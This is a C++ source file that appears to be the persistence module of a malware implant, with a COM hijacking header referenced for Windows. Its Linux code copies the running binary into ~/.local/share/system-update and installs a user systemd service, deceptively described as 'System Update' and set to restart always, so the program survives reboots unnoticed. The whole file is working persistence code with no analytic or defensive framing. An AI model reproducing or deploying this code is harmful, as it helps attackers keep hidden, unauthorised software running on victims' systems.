#include "Persistence.h"
#ifdef _WIN32
#include <windows.h>
#include <shlobj.h>
#include "ComHijacker.h"
#else
#include <unistd.h>
#include <sys/stat.h>
#include <fstream>
#include <filesystem>
#include "../utils/Exec.h"
#endif
#include "../utils/Logger.h"
#include "../utils/Shared.h"
#include <string>
namespace persistence {
#ifdef LINUX
    bool InstallSystemdUser(const std::string& path) {
        char* home = getenv("HOME"); if (!home) return false;
        std::string unitDir = std::string(home) + "/.config/systemd/user";
        std::string unitPath = unitDir + "/system-update.service";
        std::filesystem::create_directories(unitDir);
        std::ofstream f(unitPath); if (!f.is_open()) return false;
        f << "[Unit]\nDescription=System Update\n[Service]\nExecStart=" << path << "\nRestart=always\n[Install]\nWantedBy=default.target\n";
        f.close();
        utils::RunCommand("systemctl --user daemon-reload");
        utils::RunCommand("systemctl --user enable system-update.service");
        return true;
    }
#endif
std::wstring establishPersistence(const std::wstring& overridePath) {
    (void)overridePath;
#ifdef LINUX
    char res[1024]; ssize_t c = readlink("/proc/self/exe", res, 1024);
    if (c == -1) return L"";
    std::string cur(res, (size_t)c);
    std::string home = getenv("HOME") ? getenv("HOME") : "/tmp";
    std::string target = home + "/.local/share/system-update";
    std::filesystem::create_directories(home + "/.local/share");
    if (cur != target) {
        std::filesystem::copy_file(cur, target, std::filesystem::copy_options::overwrite_existing);
        chmod(target.c_str(), S_IRWXU);
    }
    InstallSystemdUser(target);
    return utils::s2ws(target);
#else
    return L"";
#endif
}
void ReinstallPersistence() { establishPersistence(); }
}
